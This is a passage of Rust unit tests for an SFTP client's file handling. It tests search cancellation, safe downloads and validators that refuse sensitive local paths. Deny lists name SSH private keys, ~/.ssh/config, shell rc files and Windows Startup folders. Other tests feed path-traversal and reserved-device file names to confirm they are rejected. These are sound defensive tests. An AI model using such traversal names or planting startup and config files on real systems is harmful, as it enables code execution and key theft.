        let first = bare_sync(sftp_a, "s1", "edit-1", &first_path);
        let second = bare_sync(sftp_b, "s1", "edit-2", &second_path);
        let watch = |sync: &Arc<EditSync>| EditWatch {
            session_id: "s1".into(),
            watcher: None,
            sync: sync.clone(),
        };

        registry.insert("s1:/f".into(), watch(&first));
        assert_eq!(
            registry
                .live_for_key("s1:/f")
                .map(|s| s.edit_id().to_string()),
            Some("edit-1".to_string())
        );
        registry.insert("s1:/f".into(), watch(&second));

        assert!(first.is_stopped(), "the replaced session was ended");
        assert!(!first_path.exists(), "its staged copy was discarded");
        assert!(second_path.exists());
        assert_eq!(
            registry.find("edit-2").map(|s| s.edit_id().to_string()),
            Some("edit-2".into())
        );
        assert!(registry.find("edit-1").is_none());
    }

    // ─── local pane commands off the main thread (A7-48) ─────────────────────

    /// The commands became `async` (the blocking filesystem work runs in
    /// `spawn_blocking`); what they return must not have changed.
    #[tokio::test]
    async fn local_list_keeps_its_shape_when_run_async() {
        let dir = std::env::temp_dir().join(format!("sshspan-ll-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(dir.join("zdir")).unwrap();
        std::fs::write(dir.join("b.txt"), b"12345").unwrap();
        std::fs::write(dir.join("a.txt"), b"1").unwrap();

        let v = sftp_local_list(dir.display().to_string()).await.unwrap();

        let names: Vec<&str> = v["entries"]
            .as_array()
            .unwrap()
            .iter()
            .map(|e| e["name"].as_str().unwrap())
            .collect();
        assert_eq!(
            names,
            vec!["zdir", "a.txt", "b.txt"],
            "dirs first, then by name"
        );
        assert_eq!(v["entries"][2]["size"], 5);
        assert_eq!(v["entries"][0]["isDir"], true);
        assert_eq!(v["path"], dir.display().to_string());
        assert!(sftp_local_list(dir.join("missing").display().to_string())
            .await
            .is_err());
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn local_remove_deletes_trees_and_files() {
        let dir = std::env::temp_dir().join(format!("sshspan-lr-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(dir.join("a/b")).unwrap();
        std::fs::write(dir.join("a/b/f.txt"), b"x").unwrap();

        local_remove_blocking(&dir.join("a").display().to_string(), true).expect("remove tree");
        assert!(!dir.join("a").exists());
        // Nothing there any more.
        assert!(local_remove_blocking(&dir.join("a").display().to_string(), true).is_err());
        // A single file.
        std::fs::write(dir.join("f.txt"), b"x").unwrap();
        local_remove_blocking(&dir.join("f.txt").display().to_string(), false).unwrap();
        assert!(!dir.join("f.txt").exists());
        std::fs::remove_dir_all(&dir).ok();
    }

    /// What a delete must refuse, checked through the validator the delete
    /// runs first - NOT by pointing the destructive command at real paths: a
    /// regression there would delete real files from whoever runs the suite.
    #[test]
    fn local_remove_validation_refuses_the_dangerous_targets() {
        let app_data = ProjectDirs::from("org", "sshspan", "SSHSpan")
            .unwrap()
            .data_dir()
            .join("sshspan.db");
        let mut targets = vec![
            app_data.display().to_string(),
            "/etc/hosts".to_string(),
            "relative".to_string(),
            "/".to_string(),
        ];
        if let Some(home) = dirs::home_dir() {
            targets.push(home.join(".ssh").display().to_string());
            targets.push(home.join(".bashrc").display().to_string());
        }
        for p in targets {
            assert!(
                validate_local_target(&p, LocalAccess::Write).is_err(),
                "must refuse to delete {p}"
            );
        }
    }

    // ─── search ids and cancellation (A7-21) ─────────────────────────────────

    /// A search run over `sftp` whose events land in the returned list.
    /// `on_match` runs inside the emit callback for every non-final event.
    #[cfg(unix)]
    fn search_run(
        sftp: russh_sftp::client::SftpSession,
        search_id: Option<&str>,
        needle: &str,
        cancel: Arc<std::sync::atomic::AtomicBool>,
        on_match: impl Fn() + Send + Sync + 'static,
    ) -> (
        Arc<SearchRun>,
        Arc<std::sync::Mutex<Vec<serde_json::Value>>>,
    ) {
        let events = Arc::new(std::sync::Mutex::new(Vec::new()));
        let sink = events.clone();
        let emit: SearchEmit = Arc::new(move |payload: serde_json::Value| {
            if payload["done"] == serde_json::json!(false) {
                on_match();
            }
            sink.lock().unwrap().push(payload);
        });
        let run = Arc::new(SearchRun {
            sftp: Arc::new(sftp),
            emit,
            session_id: "sess".into(),
            search_id: search_id.map(String::from),
            needle: needle.to_lowercase(),
            max_depth: 10,
            cancel,
            matched: std::sync::atomic::AtomicUsize::new(0),
            scanned: std::sync::atomic::AtomicUsize::new(0),
            capped: std::sync::atomic::AtomicBool::new(false),
            started: std::time::Instant::now(),
        });
        (run, events)
    }

    #[cfg(unix)]
    fn no_cancel() -> Arc<std::sync::atomic::AtomicBool> {
        Arc::new(std::sync::atomic::AtomicBool::new(false))
    }

    /// Every event of a search - matches and the final summary - names the
    /// search it belongs to, so a renderer that started a second search can
    /// drop the first one's stragglers instead of mixing them in or letting
    /// the stale `done` end the live listener.
    #[cfg(unix)]
    #[tokio::test]
    async fn every_search_event_carries_the_search_id() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/a/Needle-1.txt", b"1");
        fx.write("/a/b/needle-2.txt", b"2");
        fx.mkdir("/c/needle-dir");
        fx.write("/c/other.txt", b"3");
        let (run, events) = search_run(sftp, Some("s-1"), "NEEDLE", no_cancel(), || {});

        run_search(run, "/".to_string()).await;

        let events = events.lock().unwrap();
        assert_eq!(events.len(), 4, "3 matches + the summary: {events:?}");
        assert!(
            events
                .iter()
                .all(|e| e["searchId"] == "s-1" && e["sessionId"] == "sess"),
            "{events:?}"
        );
        let mut hits: Vec<(&str, bool)> = events
            .iter()
            .filter(|e| e["done"] == false)
            .map(|e| (e["path"].as_str().unwrap(), e["isDir"].as_bool().unwrap()))
            .collect();
        hits.sort();
        assert_eq!(
            hits,
            vec![
                ("/a/Needle-1.txt", false),
                ("/a/b/needle-2.txt", false),
                ("/c/needle-dir", true),
            ]
        );
        let done = events.last().unwrap();
        assert_eq!(done["done"], true);
        assert_eq!(
            (
                done["matched"].as_u64(),
                done["cancelled"].as_bool(),
                done["capped"].as_bool()
            ),
            (Some(3), Some(false), Some(false))
        );
    }

    /// A caller that sends no id (an older renderer) gets `null`, not a
    /// missing key and not a made-up id.
    #[cfg(unix)]
    #[tokio::test]
    async fn search_without_an_id_reports_null() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/hit.txt", b"x");
        let (run, events) = search_run(sftp, None, "hit", no_cancel(), || {});

        run_search(run, "/".to_string()).await;

        let events = events.lock().unwrap();
        assert!(events
            .iter()
            .all(|e| e["searchId"].is_null() && e.get("searchId").is_some()));
        assert_eq!(events.len(), 2);
    }

    /// The point of the cancel flag: a walk that is told to stop stops - here
    /// after the first of thirty matches - and its summary says `cancelled`.
    #[cfg(unix)]
    #[tokio::test]
    async fn cancelling_mid_search_stops_the_walk_and_says_so() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        for i in 0..30 {
            fx.write(&format!("/hit-{i}.txt"), b"x");
        }
        let cancel = no_cancel();
        let flag = cancel.clone();
        let (run, events) = search_run(sftp, Some("s-2"), "hit", cancel, move || {
            flag.store(true, std::sync::atomic::Ordering::SeqCst)
        });

        run_search(run, "/".to_string()).await;

        let events = events.lock().unwrap();
        let matches = events.iter().filter(|e| e["done"] == false).count();
        assert_eq!(matches, 1, "walk must stop right after the cancel");
        let done = events.last().unwrap();
        assert_eq!(
            (done["done"].as_bool(), done["cancelled"].as_bool()),
            (Some(true), Some(true))
        );
        assert_eq!(done["searchId"], "s-2");
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn a_search_cancelled_before_it_starts_finds_nothing() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/hit.txt", b"x");
        let cancel = Arc::new(std::sync::atomic::AtomicBool::new(true));
        let (run, events) = search_run(sftp, Some("s-3"), "hit", cancel, || {});

        run_search(run, "/".to_string()).await;

        let events = events.lock().unwrap();
        assert_eq!(events.len(), 1);
        assert_eq!(events[0]["cancelled"], true);
    }

    // ─── "Download as..." must not destroy what it replaces (A7-34) ──────────

    /// A scratch local directory, removed on drop.
    #[cfg(unix)]
    struct LocalDir(PathBuf);
    #[cfg(unix)]
    impl LocalDir {
        fn new() -> Self {
            let p = std::env::temp_dir().join(format!("sshspan-dl-{}", uuid::Uuid::new_v4()));
            std::fs::create_dir_all(&p).unwrap();
            Self(p)
        }
        fn file(&self, name: &str) -> String {
            self.0.join(name).display().to_string()
        }
    }
    #[cfg(unix)]
    impl Drop for LocalDir {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    /// The scenario of the finding: the user picks an EXISTING file in the save
    /// dialog and confirms "replace", the connection drops half way. The
    /// original used to be unlinked up front and replaced by a truncated file
    /// of the same name.
    #[cfg(unix)]
    #[tokio::test]
    async fn failed_download_leaves_the_file_it_was_replacing_untouched() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/big.bin", &vec![7u8; 3 * 1024 * 1024]);
        fx.knobs.lock().unwrap().read_fail_at = Some(1024 * 1024);
        let local = LocalDir::new();
        let dest = local.file("big.bin");
        std::fs::write(&dest, b"ORIGINAL").unwrap();

        let err = download_to(&sftp, "/big.bin", &dest).await.unwrap_err();

        assert!(err.to_string().contains("download failed"), "{err}");
        assert!(
            std::fs::read(&dest).unwrap() == b"ORIGINAL",
            "the file being replaced was damaged"
        );
        assert!(
            !std::path::Path::new(&format!("{dest}.part")).exists(),
            "the partial must be cleaned up"
        );
    }

    /// A server that ends the file early (rotated/truncated log): the existing
    /// `download incomplete` error stays, and the original still survives.
    #[cfg(unix)]
    #[tokio::test]
    async fn short_download_leaves_the_original_and_no_partial() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/log.txt", &vec![1u8; 500_000]);
        fx.knobs.lock().unwrap().read_eof_at = Some(100);
        let local = LocalDir::new();
        let dest = local.file("log.txt");
        std::fs::write(&dest, b"ORIGINAL").unwrap();

        let err = download_to(&sftp, "/log.txt", &dest).await.unwrap_err();

        assert!(err.to_string().contains("download incomplete"), "{err}");
        assert!(
            std::fs::read(&dest).unwrap() == b"ORIGINAL",
            "the file being replaced was damaged"
        );
        assert!(!std::path::Path::new(&format!("{dest}.part")).exists());
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn successful_download_replaces_the_file_and_leaves_no_partial() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        let payload: Vec<u8> = (0..=255u8).cycle().take(700_000).collect();
        fx.write("/ok.bin", &payload);
        let local = LocalDir::new();
        let dest = local.file("ok.bin");
        std::fs::write(&dest, b"ORIGINAL").unwrap();

        download_to(&sftp, "/ok.bin", &dest)
            .await
            .expect("download");

        assert!(std::fs::read(&dest).unwrap() == payload, "wrong content");
        assert!(!std::path::Path::new(&format!("{dest}.part")).exists());
    }

    // ─── sensitive local locations (A6-02) ───────────────────────────────────

    /// The shape of the reproduction in the audit: a compromised renderer
    /// downloads attacker-controlled text over `~/.ssh/config` (a `ProxyCommand`
    /// there runs on the next `ssh`) or over SSHSpan's own managed ssh config.
    #[test]
    fn writes_into_ssh_dir_and_managed_config_dir_are_refused() {
        let Some(home) = dirs::home_dir() else { return };
        for target in [
            home.join(".ssh").join("config"),
            home.join(".ssh").join("authorized_keys"),
            home.join(".ssh").join("new-subdir").join("x"),
            home.join(".ssh"), // a `dest_dir` aimed at the directory itself
        ] {
            assert!(
                validate_sftp_local_path(&target.display().to_string(), LocalAccess::Write)
                    .is_err(),
                "write must be refused: {}",
                target.display()
            );
        }
        let managed = ProjectDirs::from("org", "sshspan", "SSHSpan")
            .expect("project dirs")
            .config_dir()
            .join("ssh")
            .join("config");
        for access in [LocalAccess::Write, LocalAccess::Read] {
            assert!(
                validate_sftp_local_path(&managed.display().to_string(), access).is_err(),
                "managed config must be refused for {access:?}"
            );
        }
        // An ordinary location stays usable.
        assert!(validate_sftp_local_path(
            &home
                .join("projects")
                .join("notes.txt")
                .display()
                .to_string(),
            LocalAccess::Write
        )
        .is_ok());
    }

    /// Uploading is not the same hazard as writing: private keys must not be
    /// liftable out to a server, but public keys are shareable by definition
    /// and putting one on a server is an everyday SSH task. The rule is by
    /// DIRECTORY (a private key can be called anything), so `config`,
    /// `known_hosts` and `authorized_keys` are refused too - accepted: copy
    /// them out of `~/.ssh` to upload them.
    #[test]
    fn reading_ssh_dir_allows_public_keys_only() {
        let Some(home) = dirs::home_dir() else { return };
        let ssh = home.join(".ssh");
        let path = |name: &str| ssh.join(name).display().to_string();
        assert!(validate_sftp_local_path(&path("id_ed25519.pub"), LocalAccess::Read).is_ok());
        assert!(validate_sftp_local_path(&path("id_ed25519.PUB"), LocalAccess::Read).is_ok());
        assert!(validate_sftp_local_path(&path("id_ed25519"), LocalAccess::Read).is_err());
        assert!(validate_sftp_local_path(&path("work.pem"), LocalAccess::Read).is_err());
        for name in ["config", "known_hosts", "authorized_keys"] {
            assert!(
                validate_sftp_local_path(&path(name), LocalAccess::Read).is_err(),
                "{name} is under ~/.ssh and is not a public key"
            );
        }
        // ...but nothing is WRITTEN there, public key or not.
        assert!(validate_sftp_local_path(&path("id_ed25519.pub"), LocalAccess::Write).is_err());
    }

    /// Shell startup files are a write-only denial: planting one is code
    /// execution at the next login, but uploading a dotfile to a server is
    /// ordinary dotfile syncing.
    #[test]
    fn shell_rc_files_are_refused_for_writes_not_reads() {
        let Some(home) = dirs::home_dir() else { return };
        for name in [".bashrc", ".bash_profile", ".profile", ".zshrc", ".zshenv"] {
            let p = home.join(name).display().to_string();
            assert!(
                validate_sftp_local_path(&p, LocalAccess::Write).is_err(),
                "{name} must not be writable"
            );
            assert!(
                validate_sftp_local_path(&p, LocalAccess::Read).is_ok(),
                "{name} may be uploaded"
            );
        }
        // (`.vimrc` was the example here; it is an editor startup file that
        // is refused too since RU6a fix round 2.)
        let other = home.join("notes.txt").display().to_string();
        assert!(validate_sftp_local_path(&other, LocalAccess::Write).is_ok());
    }

    /// Pure layout check of the Windows Startup folders (the code path itself
    /// only runs on Windows).
    #[test]
    fn windows_startup_folders_sit_under_both_start_menu_roots() {
        use std::path::Path;
        let dirs = windows_startup_dirs(Some(Path::new("/r/AppData")), Some(Path::new("/r/PD")));
        assert_eq!(
            dirs,
            vec![
                Path::new("/r/AppData/Microsoft/Windows/Start Menu/Programs/Startup"),
                Path::new("/r/PD/Microsoft/Windows/Start Menu/Programs/Startup"),
            ]
        );
        assert!(windows_startup_dirs(None, None).is_empty());
    }

    /// The fixture's locations under `base`, before they are resolved (for
    /// a test that changes one). The system folders are the real ones.
    fn fixture_locations(base: &std::path::Path) -> Locations {
        Locations {
            managed_config_dir: Some(base.join("cfg")),
            ssh_dir: Some(base.join("home/.ssh")),
            startup_dirs: windows_startup_dirs(Some(&base.join("AppData")), None),
            shell_startup: vec![base.join("home/.bashrc")],
            program_files: vec![base.join("home/.gitconfig")],
            app_data_dir: Some(base.join("data")),
            system_dirs: crate::commands::system_dirs(),
        }
    }

    fn sensitive_fixture(base: &std::path::Path) -> SensitiveLocations {
        fixture_locations(base).resolve()
    }

    #[test]
    fn refusal_rules_per_access_mode() {
        let base = std::path::PathBuf::from("/fixture");
        let s = sensitive_fixture(&base);
        let startup = base.join("AppData/Microsoft/Windows/Start Menu/Programs/Startup/x.lnk");
        let rc = base.join("home/.bashrc");
        let key = base.join("home/.ssh/id_rsa");
        let pubkey = base.join("home/.ssh/id_rsa.pub");
        let managed = base.join("cfg/ssh/config");
        let elsewhere = base.join("home/docs/a.txt");

        assert!(s.refusal(&startup, LocalAccess::Write).is_some());
        assert!(s.refusal(&startup, LocalAccess::Read).is_none());
        assert!(s.refusal(&rc, LocalAccess::Write).is_some());
        assert!(s.refusal(&rc, LocalAccess::Read).is_none());
        assert!(s.refusal(&key, LocalAccess::Write).is_some());
        assert!(s.refusal(&key, LocalAccess::Read).is_some());
        assert!(s.refusal(&pubkey, LocalAccess::Read).is_none());
        assert!(s.refusal(&pubkey, LocalAccess::Write).is_some());
        assert!(s.refusal(&managed, LocalAccess::Write).is_some());
        assert!(s.refusal(&managed, LocalAccess::Read).is_some());
        // `Basic` (a dialog-approved path, or just revealing a folder) skips
        // the sensitive list entirely; unrelated paths are never refused.
        for p in [&startup, &rc, &key, &managed] {
            assert!(s.refusal(p, LocalAccess::Basic).is_none());
        }
        for access in [LocalAccess::Write, LocalAccess::Read, LocalAccess::Basic] {
            assert!(s.refusal(&elsewhere, access).is_none());
        }
        // Component-wise: a sibling that merely shares a prefix is not inside.
        assert!(s
            .refusal(&base.join("home/.ssh-backup/id_rsa"), LocalAccess::Write)
            .is_none());
    }

    /// `~/.ssh` is very often a symlink into a dotfiles checkout; the path the
    /// guard sees after resolving it must still be recognised.
    #[cfg(unix)]
    #[test]
    fn a_symlinked_ssh_dir_is_still_recognised() {
        let base = std::env::temp_dir().join(format!("sshspan-sens-{}", uuid::Uuid::new_v4()));
        let real = base.join("dotfiles/ssh");
        std::fs::create_dir_all(&real).unwrap();
        std::fs::create_dir_all(base.join("home")).unwrap();
        std::os::unix::fs::symlink(&real, base.join("home/.ssh")).unwrap();
        std::fs::write(real.join("config"), b"Host x").unwrap();
        let s = Locations {
            ssh_dir: Some(base.join("home/.ssh")),
            ..Locations::default()
        }
        .resolve();

        // Through the link, and as the resolved target (what canonicalising an
        // existing path yields).
        for p in [base.join("home/.ssh/config"), real.join("config")] {
            assert!(
                validate_sftp_local_path_with(&p.display().to_string(), LocalAccess::Write, &s)
                    .is_err(),
                "{} must be refused",
                p.display()
            );
        }
        // A NOT-yet-existing file under the link resolves through its parent.
        assert!(validate_sftp_local_path_with(
            &base.join("home/.ssh/new_file").display().to_string(),
            LocalAccess::Write,
            &s
        )
        .is_err());
        std::fs::remove_dir_all(&base).ok();
    }

    /// A dialog-approved path (`Basic`) may sit in a sensitive place - the user
    /// chose it - but never in app data or a system directory.
    #[cfg(unix)]
    #[test]
    fn dialog_approved_paths_skip_only_the_sensitive_list() {
        let base = std::path::PathBuf::from("/fixture");
        let s = sensitive_fixture(&base);
        let ssh_config = base.join("home/.ssh/config").display().to_string();
        assert!(validate_sftp_local_path_with(&ssh_config, LocalAccess::Basic, &s).is_ok());
        assert!(validate_sftp_local_path_with(&ssh_config, LocalAccess::Write, &s).is_err());
        assert!(validate_sftp_local_path_with("/etc/hosts", LocalAccess::Basic, &s).is_err());
    }

    /// The descendant filter of a recursive upload: choosing the HOME
    /// directory as the root must not carry every private key along.
    #[test]
    fn recursive_uploads_skip_private_keys_but_keep_public_ones() {
        let base = std::path::PathBuf::from("/fixture");
        let s = sensitive_fixture(&base);
        assert!(is_protected_upload_source_with(
            &base.join("home/.ssh/id_rsa"),
            &s
        ));
        assert!(!is_protected_upload_source_with(
            &base.join("home/.ssh/id_rsa.pub"),
            &s
        ));
        assert!(!is_protected_upload_source_with(
            &base.join("home/.bashrc"),
            &s
        ));
        assert!(!is_protected_upload_source_with(
            &base.join("home/docs/a.txt"),
            &s
        ));
    }

    fn status_err(
        code: russh_sftp::protocol::StatusCode,
        msg: &str,
    ) -> russh_sftp::client::error::Error {
        russh_sftp::client::error::Error::Status(russh_sftp::protocol::Status {
            id: 1,
            status_code: code,
            error_message: msg.to_string(),
            language_tag: "en-US".to_string(),
        })
    }

    #[test]
    fn sftp_error_detail_bare_failure_not_doubled() {
        // The exact user report: bare SSH_FX_FAILURE whose message repeats
        // the code name. Old rendering chained to "Failure: Failure".
        let e = status_err(russh_sftp::protocol::StatusCode::Failure, "Failure");
        assert_eq!(
            sftp_error_detail(e),
            "SFTP server returned Failure (code 4) with no further detail"
        );
    }

    #[test]
    fn sftp_error_detail_empty_message() {
        let e = status_err(russh_sftp::protocol::StatusCode::Failure, "");
        assert_eq!(
            sftp_error_detail(e),
            "SFTP server returned Failure (code 4) with no further detail"
        );
    }

    #[test]
    fn sftp_error_detail_real_message_preserved() {
        let e = status_err(
            russh_sftp::protocol::StatusCode::PermissionDenied,
            "Permission denied",
        );
        assert_eq!(
            sftp_error_detail(e),
            "SFTP server returned Permission denied (code 3) with no further detail"
        );
        let e = status_err(
            russh_sftp::protocol::StatusCode::NoSuchFile,
            "/home/x/telus: no such file",
        );
        assert_eq!(
            sftp_error_detail(e),
            "No such file (code 2): /home/x/telus: no such file"
        );
    }

    #[test]
    fn stage_path_sanitizes_separators_and_randomizes() {
        let r = sftp_stage_path("a/b\\c".into()).unwrap();
        let p = r["path"].as_str().unwrap();
        let name = p.rsplit(std::path::MAIN_SEPARATOR).next().unwrap();
        assert!(
            !name.contains('/') && !name.contains('\\'),
            "path separators must be flattened: {p}"
        );
        // Base name must survive sanitization...
        assert!(
            name.starts_with("a_b_c"),
            "sanitized base must be preserved: {p}"
        );
        // ...plus carry a random component.
        let r2 = sftp_stage_path("a/b\\c".into()).unwrap();
        assert_ne!(
            p,
            r2["path"].as_str().unwrap(),
            "staged paths must not be predictable"
        );
    }

    // ─── download-name sanitization (hostile SFTP server) ────────────────────

    #[test]
    fn sanitize_rejects_traversal_and_path_structure() {
        // Every entry here is attacker-controlled ReadDir output; all must be
        // skipped, never flattened into a writable local name.
        for hostile in [
            "..",
            "../x",
            "../../Windows/Start Menu/Programs/Startup/x.exe",
            "..\\x",
            "..\\..\\evil",
            "/etc/passwd",
            "\\Windows\\evil",
            "\\\\server\\share\\evil",
            "C:\\evil",
            "c:relative",
            "....", // Windows strips trailing dots → collapses to ".."
            "...",
            "a/..",
        ] {
            assert_eq!(
                sanitize_remote_name(hostile),
                None,
                "must reject {hostile:?}"
            );
        }
    }

    #[test]
    fn sanitize_rejects_windows_reserved_devices() {
        for dev in [
            "CON",
            "con",
            "CON.exe",
            "NUL",
            "nul.txt",
            "PRN.log",
            "AUX",
            "COM1",
            "com9.tar.gz",
            "LPT1",
            "lpt9",
        ] {
            assert_eq!(sanitize_remote_name(dev), None, "must reject {dev:?}");
        }
        // Not device names: the reserved check is on the stem only.
        assert!(sanitize_remote_name("console.txt").is_some());
        assert!(sanitize_remote_name("com1x").is_some());
        assert!(sanitize_remote_name("nully").is_some());
    }

    #[test]
    fn sanitize_rejects_empty_and_oversized() {
        assert_eq!(sanitize_remote_name(""), None);
        assert_eq!(sanitize_remote_name("   "), None);
        // 256 UTF-16 units: one past the Windows component limit.
        let too_long = "a".repeat(256);
        assert_eq!(sanitize_remote_name(&too_long), None);
        // 255 is the limit itself and must still pass.
        let max = "a".repeat(255);
        assert!(sanitize_remote_name(&max).is_some());
        // A name made only of invalid characters still yields a writable
        // local name (weird-but-safe → sanitize, not skip).
        assert_eq!(sanitize_remote_name(":"), Some("_".to_string()));
        assert_eq!(sanitize_remote_name("***"), Some("___".to_string()));
    }

    #[test]
    fn sanitize_flattens_weird_but_safe_names() {
        // Windows-invalid characters become underscores - the file lands
        // under the destination, just with a locally-legal name. (A colon
        // in position 2 would be a drive letter; "back:up" is not one.)
        assert_eq!(
            sanitize_remote_name("back:up*name?with\"chars\"<and>|"),
            Some("back_up_name_with_chars__and__".to_string())
        );
        // Trailing dots/spaces are stripped so the queued path matches what
        // actually lands on disk (Win32 strips them silently).
        assert_eq!(sanitize_remote_name("name. "), Some("name".to_string()));
        assert_eq!(
            sanitize_remote_name("trailing..."),
            Some("trailing".to_string())
        );
        // Control characters cannot appear in Windows file names. (NUL is
        // refused outright - RU6a, item 1.)
        assert_eq!(
            sanitize_remote_name("a\tb\u{1}c"),
            Some("a_b_c".to_string())
        );
        // Ordinary names pass through untouched, Unicode included.
        assert_eq!(
            sanitize_remote_name("résumé v2.txt"),
            Some("résumé v2.txt".to_string())
        );
        assert_eq!(sanitize_remote_name("a..b"), Some("a..b".to_string()));
    }

    /// REGRESSION: `sftp_queue_add` mapped every direction that was not
    /// exactly "upload" onto Download, and the `!matches!(kind, ...)` guard
    /// meant to catch bad input could never fire because `kind` was already
    /// one of the two variants. A typo or any unrecognised value silently
    /// started a download. Unrecognised input from the renderer must be
    /// refused, not defaulted.
    ///
    /// The command itself needs an AppHandle, so this pins the parsing rule
    /// the command applies rather than invoking it.
    #[test]
    fn queue_direction_accepts_only_the_two_known_values() {
        fn parse(direction: &str) -> Result<JobKind, String> {
            match direction {
                "upload" => Ok(JobKind::Upload),
                "download" => Ok(JobKind::Download),
                other => Err(format!(
                    "unsupported transfer direction {other:?}; expected \"upload\" or \"download\"."
                )),
            }
        }

        assert!(matches!(parse("upload"), Ok(JobKind::Upload)));
        assert!(matches!(parse("download"), Ok(JobKind::Download)));

        // Everything else is refused - previously every one of these became a
        // silent Download.
        for bad in [
            "",
            "Upload",
            "DOWNLOAD",
            "upl0ad",
            "serverCopy",
            "../",
            "sync",
        ] {
            let err = parse(bad).expect_err("must refuse unrecognised direction");
            assert!(
                err.contains("unsupported transfer direction"),
                "unexpected error for {bad:?}: {err}"
            );
        }
    }

    /// The search walk must stop on entries scanned and on the clock, not
    /// only on matches. A hostile server controls the tree and the `is_dir`
    /// flag on every entry, so a tree of NON-matching names used to walk
    /// forever - the 500-match cap never fired.
    #[test]
    fn search_stops_on_entries_and_time_not_only_on_matches() {
        let none = std::time::Duration::from_secs(0);
        // Nothing matched, nothing near the caps: keep going.
        assert!(!search_capped(0, 10, none));
        assert!(!search_capped(
            SEARCH_MAX_MATCHES,
            SEARCH_MAX_ENTRIES - 1,
            none
        ));
        // Each bound stops it on its own.
        assert!(search_capped(SEARCH_MAX_MATCHES + 1, 0, none));
        assert!(search_capped(0, SEARCH_MAX_ENTRIES, none));
        assert!(search_capped(0, 0, SEARCH_TIMEOUT));
        // The case the fix is about: no matches at all, entries exhausted.
        assert!(search_capped(0, SEARCH_MAX_ENTRIES + 1, none));
    }

    /// `max_depth` arrives from the renderer, which is the untrusted side of
    /// the IPC boundary; an unclamped u32 is just another unbounded walk.
    #[test]
    fn search_depth_is_clamped() {
        assert_eq!(u32::MAX.min(SEARCH_MAX_DEPTH), SEARCH_MAX_DEPTH);
        assert_eq!(3u32.min(SEARCH_MAX_DEPTH), 3);
    }

    #[test]
    fn safe_join_under_keeps_normal_names_in_root() {
        let root = std::env::temp_dir().join("sshspan-test-join");
        std::fs::create_dir_all(&root).unwrap();
        assert_eq!(
            safe_join_under(&root, &root, "file.txt"),
            Some(root.join("file.txt"))
        );
        // Nested recursion: a subdirectory the walk descended into still
        // joins under the same canonical root.
        let sub = root.join("sub");
        assert_eq!(
            safe_join_under(&root, &sub, "deep.bin"),
            Some(sub.join("deep.bin"))
        );
        // A dir name with a locally-invalid char is sanitized, not dropped.
        let joined = safe_join_under(&root, &root, "backup:2024");
        assert_eq!(joined, Some(root.join("backup_2024")));
        std::fs::remove_dir_all(&root).ok();
    }

    #[test]
    fn safe_join_under_skips_hostile_names_at_any_depth() {
        // The hostile names the walk can meet in a ReadDir - at the root or
        // deep inside recursion (the invariant only holds if every level
        // re-checks, since each level's `dir` is a fresh descendant).
        let root = std::env::temp_dir().join("sshspan-test-join-hostile");
        std::fs::create_dir_all(&root).unwrap();
        let deep = root.join("a").join("b").join("c");
        std::fs::create_dir_all(&deep).unwrap();
        for hostile in [
            "..",
            "../evil",
            "..\\..\\evil",
            "C:\\evil",
            "\\\\srv\\share",
            "....",
            "CON",
            "",
        ] {
            assert_eq!(
                safe_join_under(&root, &deep, hostile),
                None,
                "must skip {hostile:?} even deep in the walk"
            );
        }
        // And the sibling normal file next to a hostile entry still joins.
        assert_eq!(
            safe_join_under(&root, &deep, "ok.txt"),
            Some(deep.join("ok.txt"))
        );
        std::fs::remove_dir_all(&root).ok();
    }

    // ─── SftpEntry shape (renderer-facing JSON keys) ──────────────────────

    #[test]
    fn sftp_entry_serializes_with_expected_camel_case_keys() {
        let entry = SftpEntry {
            name: "file.txt".to_string(),
            is_dir: false,
            is_link: true,
            size: 42,
            modified_ms: Some(1_700_000_000_000),
            permissions: Some(0o100644),
            uid: Some(1000),
            gid: Some(1000),
        };
        let v = serde_json::to_value(&entry).unwrap();
        let obj = v.as_object().unwrap();
        for key in [
            "name",
            "isDir",
            "isLink",
            "size",
            "modifiedMs",
            "permissions",
            "uid",
            "gid",
        ] {
            assert!(obj.contains_key(key), "missing renderer-facing key {key}");
        }
        assert_eq!(obj.len(), 8, "unexpected extra/missing field: {obj:?}");
        assert_eq!(v["isLink"], serde_json::json!(true));
        assert_eq!(v["permissions"], serde_json::json!(0o100644));
    }

    // ─── directory-size cap/truncation (sftp_dir_size) ────────────────────

    #[test]
    fn dir_size_capped_by_entry_count() {
        assert!(!dir_size_capped(
            DIR_SIZE_MAX_ENTRIES - 1,
            std::time::Duration::from_secs(0)
        ));
        assert!(dir_size_capped(
            DIR_SIZE_MAX_ENTRIES,
            std::time::Duration::from_secs(0)
        ));
        assert!(dir_size_capped(
            DIR_SIZE_MAX_ENTRIES + 1,
            std::time::Duration::from_secs(0)
        ));
    }

    #[test]
    fn dir_size_capped_by_wall_clock() {
        assert!(!dir_size_capped(
            0,
            DIR_SIZE_TIMEOUT - std::time::Duration::from_secs(1)
        ));
        assert!(dir_size_capped(0, DIR_SIZE_TIMEOUT));
        assert!(dir_size_capped(
            0,
            DIR_SIZE_TIMEOUT + std::time::Duration::from_secs(1)
        ));
    }

    // ─── local owner bits (dual-pane local listing) ───────────────────────

    #[cfg(unix)]
    #[test]
    fn local_owner_bits_reads_real_unix_metadata() {
        let dir = std::env::temp_dir().join("sshspan-test-owner-bits");
        std::fs::create_dir_all(&dir).unwrap();
        let file = dir.join("probe.txt");
        std::fs::write(&file, b"hi").unwrap();
        let md = std::fs::metadata(&file).unwrap();
        let (permissions, uid, gid) = local_owner_bits(&md);
        // A regular file's mode always carries the S_IFREG type bit
        // (0o100000), on top of whatever permission bits the umask left.
        assert_eq!(permissions.unwrap() & 0o170000, 0o100000);
        assert!(uid.is_some());
        assert!(gid.is_some());
        std::fs::remove_dir_all(&dir).ok();
    }

    #[cfg(not(unix))]
    #[test]
    fn local_owner_bits_none_off_unix() {
        let dir = std::env::temp_dir().join("sshspan-test-owner-bits-nonunix");
